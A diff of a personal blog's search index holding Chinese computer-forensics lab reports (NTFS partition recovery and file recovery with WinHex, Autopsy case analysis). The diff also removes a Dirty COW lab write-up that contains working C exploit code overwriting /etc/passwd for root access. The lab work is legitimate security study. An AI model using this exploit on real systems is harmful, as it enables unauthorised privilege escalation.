@@ -1,6 +1,74 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title></title>
+    <url>/posts/0.html</url>
+    <content><![CDATA[<hr />
+<hr />
+<p>::: center<br />
+<br />
+<br />
+实验报告<br />
+:::</p>
+<blockquote>
+<p>课程名称：[计算机取证学]{.underline}</p>
+<p>项目编号：[实验5]{.underline}</p>
+<p>项目名称：[NTFS 硬盘分区的恢复]{.underline}</p>
+<p>学 院：[网络空间安全学院（研究院）]{.underline}</p>
+<p>专 业：[密码科学与技术]{.underline}</p>
+<p>学生姓名：[叶占胜]{.underline}</p>
+<p>学 号：</p>
+<p>2024年4月5日</p>
+</blockquote>
+<h1 id="实验目的"><a class="markdownIt-Anchor" href="#实验目的"></a> 实验目的</h1>
+<p>学会使用 winhex 恢复硬盘分区。</p>
+<h1 id="实验环境"><a class="markdownIt-Anchor" href="#实验环境"></a> 实验环境</h1>
+<p>安装有 winhex 的 windows 系统、shiyan7.vhd 文件。</p>
+<h1 id="实验步骤"><a class="markdownIt-Anchor" href="#实验步骤"></a> 实验步骤</h1>
+<p>1、将 shiyan.vhd 挂载到C盘。</p>
+<p><img src="1.1.png" alt="将 shiyan.vhd 挂载到C盘" />{width=&quot;10cm&quot;}</p>
+<p>2、搜索 NTFS 的 MBR 十六进制特征码 EB5290 。</p>
+<p><img src="1.2.png" alt="搜索结果" />{width=&quot;10cm&quot;}</p>
+<p>3、分析得第一个扇区的信息：分区大小（在偏移 0x28H处 ：344063（0x53fff）<br />
+，结束扇区（见左下角）：344191（0x54080）；相减得起始扇区：128（80）。同理可得第二个扇区的信息：分区大小：303103（0x49fff）<br />
+，结束位置：647295（9e07f），起始扇区：344192（54080）。</p>
+<figure>
+<img src="1.3.png" style="width:6cm" />
+<img src="1.4.png" style="width:6cm" />
+<figcaption>第二个扇区信息</figcaption>
+</figure>
+<p>4、在分区最前面找到分区终止符 55 AA ，在前面修改为正确分区。</p>
+<figure>
+<img src="1.5.png" style="width:6cm" />
+<img src="1.6.png" style="width:6cm" />
+<figcaption>扇区信息修改后</figcaption>
+</figure>
+<p>5、保存后发现成功分区。</p>
+<figure>
+<img src="1.7.png" style="width:6cm" />
+<img src="1.8.png" style="width:6cm" />
+<figcaption>winhex显示分区成功</figcaption>
+</figure>
+<p>6、在第一个分区的 MFT 中 ctrl + f 搜索关键词 abc.txt 。</p>
+<p><img src="1.9.png" alt="搜索关键词 abc.txt" />{width=&quot;10cm&quot;}</p>
+<p>7、经过尝试发现搜索结果2是有效的。在上方复制并查找16进制数值。</p>
+<p><img src="1.10.png" alt="查找16进制数值" />{width=&quot;10cm&quot;}</p>
+<p>8、由下图可以获取以下消息：文件大小：1B52(十进制<br />
+6994)；簇数：D502；首簇号：07(十进制 07)。</p>
+<p><img src="1.11.png" alt="获取文件信息" />{width=&quot;10cm&quot;}</p>
+<p>9、ctrl + g 搜索首簇号的位置。</p>
+<p><img src="1.12.png" alt="搜索搜簇号的位置" />{width=&quot;10cm&quot;}</p>
+<p>10、alt + g 输入文件大小查找末bit的位置。</p>
+<figure>
+<img src="1.13.png" style="width:6cm" />
+<img src="1.14.png" style="width:6cm" />
+<figcaption>末bit的位置</figcaption>
+</figure>
+<p>11、保存为abc.txt，恢复成功。</p>
+<p><img src="1.15.png" alt="abc.txt的部分内容" />{width=&quot;10cm&quot;}</p>
+]]></content>
+  </entry>
+  <entry>
     <title>Ddigital-Forensics-Lab-1</title>
     <url>/posts/c46c9d0d.html</url>
     <content><![CDATA[<h1 id="实验目的"><a class="markdownIt-Anchor" href="#实验目的"></a> 实验目的</h1>
@@ -124,39 +192,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Ddigital-Forensics-Lab-3</title>
-    <url>/posts/2947dde5.html</url>
-    <content><![CDATA[<h1 id="实验目的"><a class="markdownIt-Anchor" href="#实验目的"></a> 实验目的</h1>
-<p>学会在kali linux中利用autopsy创建实验案例，并利用autopsy对案例进行分析。</p>
-<h1 id="实验环境"><a class="markdownIt-Anchor" href="#实验环境"></a> 实验环境</h1>
-<p>安装有kali linux的虚拟机、磁盘镜像文件thumbimage_fat.dd。</p>
-<h1 id="实验步骤"><a class="markdownIt-Anchor" href="#实验步骤"></a> 实验步骤</h1>
-<p>1、打开autopsy取证分析浏览器，<br />
-在管理员权限下运行<code>autospsy</code>，登录：<code>http://localhost:9999/autops</code>。</p>
-<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Digital%20Forensics/Lab_3/1.1.png" alt="运行程序得到的结果" /></p>
-<p>2、在autopsy中创建新案例，记录下autopsy计算的镜像文件的哈希值。</p>
-<p>案例信息：受攻击web服务器的主机名为<code>www.hacker.ucs.ca</code>，实验中使用的&quot;thumbimage_fat.dd&quot;是在犯罪现场获取的磁盘镜像。</p>
-<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Digital%20Forensics/Lab_3/1.2.png" alt="计算除MD5哈希值" /></p>
-<p>3、利用autopsy进行电子证据磁盘分析。</p>
-<p>完成创建后，在案例分析中找到keyword<br />
-search，在磁盘镜像中搜索关键字&quot;Wikipedia&quot;,将调查一步一步地深入下去，并回答下列问题。</p>
-<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Digital%20Forensics/Lab_3/1.3.png" alt="搜索关键字编码为ASCII格式" /></p>
-<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Digital%20Forensics/Lab_3/1.4.png" alt="搜索关键字编码为Unicode格式" /></p>
-<p>问题1：当搜索关键字编码为ASCII格式时，命中次数是多少</p>
-<p>答：1次。</p>
-<p>问题2：关键字结果所在数据单元的编号（或地址）是什么</p>
-<p>答：Unit 8291 (Hex - Ascii)。</p>
-<p>问题3：当搜索关键字编码为Unicode格式时，命中次数是多少</p>
-<p>答：0次。</p>
-]]></content>
-      <categories>
-        <category>计算机取证学</category>
-      </categories>
-      <tags>
-        <tag>Linux</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Ddigital-Forensics-Lab-2</title>
     <url>/posts/5d65ccb7.html</url>
     <content><![CDATA[<h1 id="实验目的"><a class="markdownIt-Anchor" href="#实验目的"></a> 实验目的</h1>
@@ -207,36 +242,36 @@ search，在磁盘镜像中搜索关键字&quot;Wikipedia&quot;,将调查一步�
       </tags>
   </entry>
   <entry>
-    <title>Ddigital-Forensics-Lab-5</title>
-    <url>/posts/179be3c4.html</url>
+    <title>Ddigital-Forensics-Lab-3</title>
+    <url>/posts/2947dde5.html</url>
     <content><![CDATA[<h1 id="实验目的"><a class="markdownIt-Anchor" href="#实验目的"></a> 实验目的</h1>
-<p>使用 winhex 对删除的文件进行恢复。</p>
+<p>学会在kali linux中利用autopsy创建实验案例，并利用autopsy对案例进行分析。</p>
 <h1 id="实验环境"><a class="markdownIt-Anchor" href="#实验环境"></a> 实验环境</h1>
-<p>安装有 winhex 的 windows 系统、shiyan.vhd 文件。</p>
+<p>安装有kali linux的虚拟机、磁盘镜像文件thumbimage_fat.dd。</p>
 <h1 id="实验步骤"><a class="markdownIt-Anchor" href="#实验步骤"></a> 实验步骤</h1>
-<p>1、将 shiyan.vhd 挂载到C盘。</p>
-<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Digital%20Forensics/Lab_5/1.1.png" alt="将 shiyan.vhd 挂载到C盘" /></p>
-<p>2、找到 MFT 中 paper.zip 的位置。</p>
-<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Digital%20Forensics/Lab_5/1.2.png" alt="找到 MFT 中 paper.zip 的位置" /></p>
-<p>3、ctrl + f 搜索关键词 paper 。</p>
-<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Digital%20Forensics/Lab_5/1.3.png" alt="搜索关键词 paper" /></p>
-<p>4、在上方复制并查找16进制数值。</p>
-<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Digital%20Forensics/Lab_5/1.4.png" alt="复制16进制数值" /></p>
-<p>5、由下图可以获取以下消息：文件大小：1226D8(十进制 1189592)；簇数：1123；首簇号：042D(十进制 1069)。</p>
-<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Digital%20Forensics/Lab_5/1.5.png" alt="查找16进制数值" /></p>
-<p>6、ctrl + g 搜索首簇号的位置。</p>
-<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Digital%20Forensics/Lab_5/1.6.png" alt="搜索搜簇号的位置" /></p>
-<p>7、alt + g 输入文件大小查找末bit的位置。</p>
-<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Digital%20Forensics/Lab_5/1.7.png" alt="查找末bit的位置" /></p>
-<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Digital%20Forensics/Lab_5/1.8.png" alt="末bit的位置" /></p>
-<p>8、保存为paper.zip，解压后发现获得了一个PDF文件，恢复成功。</p>
-<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Digital%20Forensics/Lab_5/1.9.png" alt="将 shiyan.vhd 挂载到C盘" /></p>
+<p>1、打开autopsy取证分析浏览器，<br />
+在管理员权限下运行<code>autospsy</code>，登录：<code>http://localhost:9999/autops</code>。</p>
+<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Digital%20Forensics/Lab_3/1.1.png" alt="运行程序得到的结果" /></p>
+<p>2、在autopsy中创建新案例，记录下autopsy计算的镜像文件的哈希值。</p>
+<p>案例信息：受攻击web服务器的主机名为<code>www.hacker.ucs.ca</code>，实验中使用的&quot;thumbimage_fat.dd&quot;是在犯罪现场获取的磁盘镜像。</p>
+<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Digital%20Forensics/Lab_3/1.2.png" alt="计算除MD5哈希值" /></p>
+<p>3、利用autopsy进行电子证据磁盘分析。</p>
+<p>完成创建后，在案例分析中找到keyword<br />
+search，在磁盘镜像中搜索关键字&quot;Wikipedia&quot;,将调查一步一步地深入下去，并回答下列问题。</p>
+<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Digital%20Forensics/Lab_3/1.3.png" alt="搜索关键字编码为ASCII格式" /></p>
+<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Digital%20Forensics/Lab_3/1.4.png" alt="搜索关键字编码为Unicode格式" /></p>
+<p>问题1：当搜索关键字编码为ASCII格式时，命中次数是多少</p>
+<p>答：1次。</p>
+<p>问题2：关键字结果所在数据单元的编号（或地址）是什么</p>
+<p>答：Unit 8291 (Hex - Ascii)。</p>
+<p>问题3：当搜索关键字编码为Unicode格式时，命中次数是多少</p>
+<p>答：0次。</p>
 ]]></content>
       <categories>
         <category>计算机取证学</category>
       </categories>
       <tags>
-        <tag>Windows</tag>
+        <tag>Linux</tag>
       </tags>
   </entry>
   <entry>
@@ -443,6 +478,39 @@ FAT CONTENTS (in sectors)
       </tags>
   </entry>
   <entry>
+    <title>Ddigital-Forensics-Lab-5</title>
+    <url>/posts/179be3c4.html</url>
+    <content><![CDATA[<h1 id="实验目的"><a class="markdownIt-Anchor" href="#实验目的"></a> 实验目的</h1>
+<p>使用 winhex 对删除的文件进行恢复。</p>
+<h1 id="实验环境"><a class="markdownIt-Anchor" href="#实验环境"></a> 实验环境</h1>
+<p>安装有 winhex 的 windows 系统、shiyan.vhd 文件。</p>
+<h1 id="实验步骤"><a class="markdownIt-Anchor" href="#实验步骤"></a> 实验步骤</h1>
+<p>1、将 shiyan.vhd 挂载到C盘。</p>
+<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Digital%20Forensics/Lab_5/1.1.png" alt="将 shiyan.vhd 挂载到C盘" /></p>
+<p>2、找到 MFT 中 paper.zip 的位置。</p>
+<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Digital%20Forensics/Lab_5/1.2.png" alt="找到 MFT 中 paper.zip 的位置" /></p>
+<p>3、ctrl + f 搜索关键词 paper 。</p>
+<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Digital%20Forensics/Lab_5/1.3.png" alt="搜索关键词 paper" /></p>
+<p>4、在上方复制并查找16进制数值。</p>
+<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Digital%20Forensics/Lab_5/1.4.png" alt="复制16进制数值" /></p>
+<p>5、由下图可以获取以下消息：文件大小：1226D8(十进制 1189592)；簇数：1123；首簇号：042D(十进制 1069)。</p>
+<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Digital%20Forensics/Lab_5/1.5.png" alt="查找16进制数值" /></p>
+<p>6、ctrl + g 搜索首簇号的位置。</p>
+<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Digital%20Forensics/Lab_5/1.6.png" alt="搜索搜簇号的位置" /></p>
+<p>7、alt + g 输入文件大小查找末bit的位置。</p>
+<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Digital%20Forensics/Lab_5/1.7.png" alt="查找末bit的位置" /></p>
+<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Digital%20Forensics/Lab_5/1.8.png" alt="末bit的位置" /></p>
+<p>8、保存为paper.zip，解压后发现获得了一个PDF文件，恢复成功。</p>
+<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Digital%20Forensics/Lab_5/1.9.png" alt="将 shiyan.vhd 挂载到C盘" /></p>
+]]></content>
+      <categories>
+        <category>计算机取证学</category>
+      </categories>
+      <tags>
+        <tag>Windows</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Digital-Currency-and-Blockchain-Lab-2</title>
     <url>/posts/661cdd66.html</url>
     <content><![CDATA[<h1 id="实验目的"><a class="markdownIt-Anchor" href="#实验目的"></a> 实验目的</h1>
@@ -478,68 +546,6 @@ ecc-pycrypto 库中的 P256 椭圆曲线的一个简单实现。</p>
       </categories>
       <tags>
         <tag>Python</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Dirty_COW_Attack_Lab</title>
-    <url>/posts/4a597bff.html</url>
-    <content><![CDATA[<h1 id="实验目的"><a class="markdownIt-Anchor" href="#实验目的"></a> 实验目的</h1>
-<p>  1、获得 Dirty COW 攻击的实践经验。</p>
-<p>  2、了解攻击所利用的竞争条件漏洞。</p>
-<p>  3、更深入地了解一般竞争条件安全问题。</p>
-<h1 id="实验原理"><a class="markdownIt-Anchor" href="#实验原理"></a> 实验原理</h1>
-<p>  利用 Dirty COW 竞争条件漏洞获得 root 权限。</p>
-<h1 id="实验环境"><a class="markdownIt-Anchor" href="#实验环境"></a> 实验环境</h1>
-<p>  Ubuntu 12.04 虚拟机。</p>
-<h1 id="实验任务"><a class="markdownIt-Anchor" href="#实验任务"></a> 实验任务</h1>
-<h2 id="task1"><a class="markdownIt-Anchor" href="#task1"></a> Task1</h2>
-<h3 id="创建虚拟只读文件"><a class="markdownIt-Anchor" href="#创建虚拟只读文件"></a> 创建虚拟只读文件</h3>
-<p>  步骤：</p>
-<p>  1、sudo touch /zzz指令在根目录下创建一个名为 zzz 的空文件。</p>
-<p>  2、sudo chmod 644 /zzz指令将 zzz 文件的权限设置为 644，即如果未获得根目录权限则对 zzz 文件的权限为只读。</p>
-<p>  3、sudo gedit /zzz指令用 gedit 编辑器打开 zzz 文件。</p>
-<p>  4、在 gedit 编辑器中输入&quot;SuperYzsisagoodman.&quot;，保存并关闭。</p>
-<p>  5、ls -l /zzz指令查看 zzz 文件的权限，显示为-rw-r--r--，即文件所有者的权限为读写，同组用户和其他用户的权限为只读。</p>
-<p>  6、echo 99999 &gt; /zzz 指令将 99999 写入 zzz 文件，显示为Permission denied，即无权限。</p>
-<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Dirty-COW-Attack-Lab/1.1.png" alt="创建虚拟只读文件" /></p>
-<h3 id="发起攻击"><a class="markdownIt-Anchor" href="#发起攻击"></a> 发起攻击</h3>
-<p>  步骤：</p>
-<p>  1、gedit cow_attack.c 创建一个名为 cow_attack.c 的 C 语言文件并使用 gedit 编辑器打开，编写攻击代码：</p>
-<p>  main 线程将/zzz 映射到内存中，找到序列&quot;SuperYzs&quot;的位置，然后创建两个线程来利用操作系统内核中的 Dirty COW 竞争条件漏洞。</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">   <span class="type">pthread_t</span> pth1,pth2;</span><br><span class="line">   <span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">st</span>;</span></span><br><span class="line">   <span class="type">int</span> file_size;</span><br><span class="line"></span><br><span class="line">   <span class="comment">// Open the target file in the read-only mode.</span></span><br><span class="line">   <span class="type">int</span> f=open(<span class="string">&quot;/zzz&quot;</span>, O_RDONLY);</span><br><span class="line"></span><br><span class="line">   <span class="comment">// Map the file to COW memory using MAP_PRIVATE.</span></span><br><span class="line">   fstat(f, &amp;st);</span><br><span class="line">   file_size = st.st_size;</span><br><span class="line">   <span class="built_in">map</span>=mmap(<span class="literal">NULL</span>, file_size, PROT_READ, MAP_PRIVATE, f, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">   <span class="comment">// Find the position of the target area</span></span><br><span class="line">   <span class="type">char</span> *position = <span class="built_in">strstr</span>(<span class="built_in">map</span>, <span class="string">&quot;SuperYzs&quot;</span>);                        </span><br><span class="line"></span><br><span class="line">   <span class="comment">// We have to do the attack using two threads.</span></span><br><span class="line">   pthread_create(&amp;pth1, <span class="literal">NULL</span>, madviseThread, (<span class="type">void</span>  *)file_size); </span><br><span class="line">   pthread_create(&amp;pth2, <span class="literal">NULL</span>, writeThread, position);             </span><br><span class="line"></span><br><span class="line">   <span class="comment">// Wait for the threads to finish.</span></span><br><span class="line">   pthread_join(pth1, <span class="literal">NULL</span>);</span><br><span class="line">   pthread_join(pth2, <span class="literal">NULL</span>);</span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>  下面 write 线程的任务是将内存中的字符串&quot;SuperYzs&quot;替换为&quot;********&quot;。由于映射的内存是 COW 类型，只有这个线程时仅能修改映射内存的副本，不会对底层的/zzz 文件进行任何更改。</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> *<span class="title function_">writeThread</span><span class="params">(<span class="type">void</span> *arg)</span></span><br><span class="line">&#123;</span><br><span class="line">   <span class="type">char</span> *content= <span class="string">&quot;********&quot;</span>;</span><br><span class="line">   <span class="type">off_t</span> offset = (<span class="type">off_t</span>) arg;</span><br><span class="line"></span><br><span class="line">   <span class="type">int</span> f=open(<span class="string">&quot;/proc/self/mem&quot;</span>, O_RDWR);</span><br><span class="line">   <span class="keyword">while</span>(<span class="number">1</span>) &#123;</span><br><span class="line">      <span class="comment">// Move the file pointer to the corresponding position.</span></span><br><span class="line">      lseek(f, offset, SEEK_SET);</span><br><span class="line">      <span class="comment">// Write to the memory.</span></span><br><span class="line">      write(f, content, <span class="built_in">strlen</span>(content));</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>  madvise 线程只执行一项任务：丢弃映射内存的私有副本，以便页表可以重新指向原始映射内存。</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> *<span class="title function_">madviseThread</span><span class="params">(<span class="type">void</span> *arg)</span></span><br><span class="line">&#123;</span><br><span class="line">   <span class="type">int</span> file_size = (<span class="type">int</span>) arg;</span><br><span class="line">   <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">      madvise(<span class="built_in">map</span>, file_size, MADV_DONTNEED);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>  2、gcc cow_attack.c -lpthread 指令使用多线程编译指令-lpthread编译 cow_attack.c 文件，使用 ls 指令发现生成了a.out文件。</p>
-<p>  3、./a.out 指令运行 a.out 文件，等待一顿时间后退出程序。</p>
-<p>  4、cat /zzz 指令查看 zzz 文件，发现文件内容已经被修改 &quot;********isagoodman&quot;，即&quot;SuperYzs已被替换为&quot;********&quot;，攻击成功。</p>
-<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Dirty-COW-Attack-Lab/1.2.png" alt="攻击步骤" /></p>
-<h2 id="task-2-修改口令文件以获取-root-权限"><a class="markdownIt-Anchor" href="#task-2-修改口令文件以获取-root-权限"></a> Task 2: 修改口令文件以获取 Root 权限</h2>
-<p>  步骤：</p>
-<p>  1、使用sudo adduser charlie指令创建一个名为 charlie 的用户。</p>
-<p>  2、使用cat /etc/passwd | grep charlie查看charlie的记录。</p>
-<p>  3、使用gedit cow_attack.c 指令将cow_attack.c文件使用 gedit 编辑器打开，修改代码达到攻击目的：即找到/etc/passwd文件中的charlie记录，将其第三个字段改为0，注意改完之后的字段总长度与之前相同，不足的部分使用&quot;,&quot;补齐。</p>
-<p>  4、使用gcc cow_attack.c -lpthread指令编译 cow_attack.c 文件，使用./a.out指令运行 a.out 文件，等待一顿时间后退出程序。</p>
-<p>  5、再次使用cat /etc/passwd | grep charlie查看charlie的记录，发现第三个字符已经改为0了，即charlie已经具有了root权限。</p>
-<p>  6、使用su charlie 切换到 charlie 用户，在 shell 提示符处看到 # 符号，这是 rootshell 的指示符。运行 id 命令，发现已经获得了 root 权限，攻击成功。</p>
-<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Dirty-COW-Attack-Lab/2.1.png" alt="创建charlie用户" /></p>
-<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Dirty-COW-Attack-Lab/2.2.png" alt="Dirty COW 攻击" /></p>
-<h1 id="思考题"><a class="markdownIt-Anchor" href="#思考题"></a> 思考题</h1>
-<h2 id="q1"><a class="markdownIt-Anchor" href="#q1"></a> Q1</h2>
-<p>  会打印出字符串&quot;World&quot;。 当这个文件使用 mmap() 映射到内存（整个文件）时，每个字符都会被存储在连续的内存地址中，内存地址被存储在一个变量map 中，其中map指向映射内存的起始地址，也就是字符串&quot;Hello World&quot;的'H'的地址。map + 6则是指向'W'的地址，因此printf(&quot;%s\n&quot;, map + 6)；将从地址map + 6开始打印，直到遇到一个null字符（字符串结束标志），因此会打印出字符串&quot;World&quot;。</p>
-<h2 id="q2"><a class="markdownIt-Anchor" href="#q2"></a> Q2</h2>
-<p>  不可以。因为线程共享相同的地址空间，因此可以更容易地制造出Dirty-Cow攻击的必要条件；而进程则拥有独立的内存空间，使得攻击难以进行。</p>
-<h1 id="代码附录"><a class="markdownIt-Anchor" href="#代码附录"></a> 代码附录</h1>
-<h2 id="task1-2"><a class="markdownIt-Anchor" href="#task1-2"></a> Task1</h2>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *<span class="built_in">map</span>;</span><br><span class="line"><span class="type">void</span> *<span class="title function_">writeThread</span><span class="params">(<span class="type">void</span> *arg)</span>;</span><br><span class="line"><span class="type">void</span> *<span class="title function_">madviseThread</span><span class="params">(<span class="type">void</span> *arg)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">   <span class="type">pthread_t</span> pth1,pth2;</span><br><span class="line">   <span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">st</span>;</span></span><br><span class="line">   <span class="type">int</span> file_size;</span><br><span class="line"></span><br><span class="line">   <span class="comment">// Open the target file in the read-only mode.</span></span><br><span class="line">   <span class="type">int</span> f=open(<span class="string">&quot;/zzz&quot;</span>, O_RDONLY);</span><br><span class="line"></span><br><span class="line">   <span class="comment">// Map the file to COW memory using MAP_PRIVATE.</span></span><br><span class="line">   fstat(f, &amp;st);</span><br><span class="line">   file_size = st.st_size;</span><br><span class="line">   <span class="built_in">map</span>=mmap(<span class="literal">NULL</span>, file_size, PROT_READ, MAP_PRIVATE, f, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">   <span class="comment">// Find the position of the target area</span></span><br><span class="line">   <span class="type">char</span> *position = <span class="built_in">strstr</span>(<span class="built_in">map</span>, <span class="string">&quot;SuperYzs&quot;</span>);                        </span><br><span class="line"></span><br><span class="line">   <span class="comment">// We have to do the attack using two threads.</span></span><br><span class="line">   pthread_create(&amp;pth1, <span class="literal">NULL</span>, madviseThread, (<span class="type">void</span>  *)file_size); </span><br><span class="line">   pthread_create(&amp;pth2, <span class="literal">NULL</span>, writeThread, position);             </span><br><span class="line"></span><br><span class="line">   <span class="comment">// Wait for the threads to finish.</span></span><br><span class="line">   pthread_join(pth1, <span class="literal">NULL</span>);</span><br><span class="line">   pthread_join(pth2, <span class="literal">NULL</span>);</span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *<span class="title function_">writeThread</span><span class="params">(<span class="type">void</span> *arg)</span></span><br><span class="line">&#123;</span><br><span class="line">   <span class="type">char</span> *content= <span class="string">&quot;********&quot;</span>;</span><br><span class="line">   <span class="type">off_t</span> offset = (<span class="type">off_t</span>) arg;</span><br><span class="line"></span><br><span class="line">   <span class="type">int</span> f=open(<span class="string">&quot;/proc/self/mem&quot;</span>, O_RDWR);</span><br><span class="line">   <span class="keyword">while</span>(<span class="number">1</span>) &#123;</span><br><span class="line">      <span class="comment">// Move the file pointer to the corresponding position.</span></span><br><span class="line">      lseek(f, offset, SEEK_SET);</span><br><span class="line">      <span class="comment">// Write to the memory.</span></span><br><span class="line">      write(f, content, <span class="built_in">strlen</span>(content));</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *<span class="title function_">madviseThread</span><span class="params">(<span class="type">void</span> *arg)</span></span><br><span class="line">&#123;</span><br><span class="line">   <span class="type">int</span> file_size = (<span class="type">int</span>) arg;</span><br><span class="line">   <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">      madvise(<span class="built_in">map</span>, file_size, MADV_DONTNEED);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h2 id="task2"><a class="markdownIt-Anchor" href="#task2"></a> Task2</h2>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *<span class="built_in">map</span>;</span><br><span class="line"><span class="type">void</span> *<span class="title function_">writeThread</span><span class="params">(<span class="type">void</span> *arg)</span>;</span><br><span class="line"><span class="type">void</span> *<span class="title function_">madviseThread</span><span class="params">(<span class="type">void</span> *arg)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">pthread_t</span> pth1,pth2;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">st</span>;</span></span><br><span class="line">  <span class="type">int</span> file_size;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Open the target file in the read-only mode.</span></span><br><span class="line">  <span class="type">int</span> f=open(<span class="string">&quot;/etc/passwd&quot;</span>, O_RDONLY);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Map the file to COW memory using MAP_PRIVATE.</span></span><br><span class="line">  fstat(f, &amp;st);</span><br><span class="line">  file_size = st.st_size;</span><br><span class="line">  <span class="built_in">map</span>=mmap(<span class="literal">NULL</span>, file_size, PROT_READ, MAP_PRIVATE, f, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Find the position of the target area</span></span><br><span class="line">  <span class="type">char</span> *position = <span class="built_in">strstr</span>(<span class="built_in">map</span>, <span class="string">&quot;charlie&quot;</span>);                        </span><br><span class="line"></span><br><span class="line">  <span class="comment">// We have to do the attack using two threads.</span></span><br><span class="line">  pthread_create(&amp;pth1, <span class="literal">NULL</span>, madviseThread, (<span class="type">void</span>  *)file_size); </span><br><span class="line">  pthread_create(&amp;pth2, <span class="literal">NULL</span>, writeThread, position);             </span><br><span class="line"></span><br><span class="line">  <span class="comment">// Wait for the threads to finish.</span></span><br><span class="line">  pthread_join(pth1, <span class="literal">NULL</span>);</span><br><span class="line">  pthread_join(pth2, <span class="literal">NULL</span>);</span><br><span class="line">  <span class="keyword">return</span> <span 